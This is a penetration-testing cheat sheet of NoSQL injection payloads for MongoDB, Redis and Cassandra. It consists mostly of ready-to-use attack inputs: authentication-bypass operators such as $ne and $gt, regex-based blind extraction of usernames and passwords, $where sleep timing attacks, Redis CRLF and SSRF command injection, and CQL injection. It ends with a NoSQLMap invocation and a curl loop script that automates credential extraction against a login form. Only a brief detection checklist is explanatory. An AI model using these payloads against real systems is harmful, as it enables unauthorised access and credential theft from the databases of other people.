# NoSQL Injection — MongoDB, CouchDB, Redis, Cassandra

## MONGODB INJECTION

### Auth Bypass (JSON body)
```javascript
// Operator injection:
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$gte": ""}, "password": {"$gte": ""}}
{"username": {"$in": ["admin","administrator","root","user"]}, "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$ne": null}}
{"$or": [{"username": "admin"}, {"role": "admin"}], "password": {"$ne": null}}

// Array injection:
{"username": ["admin"], "password": {"$ne": null}}

// $where injection (when JS engine enabled):
{"$where": "return true"}
{"$where": "1==1"}
{"username": "admin", "$where": "this.password.length > 0"}
```

### GET Parameter Injection (URL)
```
?username[$ne]=invalid&password[$ne]=invalid
?username[$gt]=&password[$gt]=
?username[$regex]=^admin&password[$ne]=x
?username[$in][]=admin&username[$in][]=root&password[$ne]=x
?filter[$where]=return+true
?query={"$where":"sleep(5000)"}
```

### Blind Data Extraction (Regex-based)
```javascript
// Extract username char-by-char:
{"username": {"$regex": "^a"}, "password": {"$ne": null}}  // true if starts with 'a'
{"username": {"$regex": "^ad"}, "password": {"$ne": null}} // true if starts with 'ad'
// Continue building → "admin"

// Extract password:
{"username": "admin", "password": {"$regex": "^p"}}
{"username": "admin", "password": {"$regex": "^pa"}}
// → "password123"
```

### Timing-Based Extraction
```javascript
// Sleep via $where (MongoDB 3.x):
{"$where": "sleep(3000); return this.username == 'admin'"}

// Blind timing via regex complexity:
{"username": {"$regex": "^(a+)+$"}, "password": {"$ne": null}}
// ReDoS-style delay on match → timing oracle
```

### Operator Injection in Aggregation
```javascript
// Pipeline injection:
?aggregate=[{"$match": {"$where": "sleep(3000); return true"}}]
?filter={"$where":"this.role=='admin'"}
```

---

## REDIS INJECTION

```bash
# CRLF injection into Redis commands:
key%0d%0aSET injected_key hacked%0d%0a
# Results in: CRLF → SET injected_key hacked executed

# If user input goes into Lua scripts:
eval "return redis.call('set','INJECT','value')" 0

# Redis via SSRF:
# GET http://internal-redis:6379/\r\nSET admin 1\r\n
```

---

## CASSANDRA (CQL) INJECTION

```sql
-- CQL has limited injection surface but:
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
-- Cassandra doesn't support OR across partition keys → test ALLOW FILTERING contexts

-- Token injection:
SELECT * FROM users WHERE token(username) > token('admin') ALLOW FILTERING;
```

---

## NOSQL DETECTION CHECKLIST

```
Signal                  | Indicator
------------------------|------------------------------------
{"$ne": null} → auth bypass | MongoDB operator injection
[$ne]=null in GET params | URL-encoded operator injection  
500 error on JSON op keys | Server processes operators
Regex response timing diff | Blind extraction possible
JS error on $where      | JS execution context present
Array in field → login  | Array type confusion
```

---

## TOOLS FOR NOSQL

```bash
# NoSQLMap:
nosqlmap -u http://target.com/login -d mongodb

# Manual with curl:
curl -X POST http://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# Automated regex extraction script:
for char in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  result=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://target.com/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":{\"\\$regex\":\"^$char\"},\"password\":{\"\\$ne\":null}}")
  if [ "$result" == "200" ]; then echo "Starts with: $char"; fi
done
```
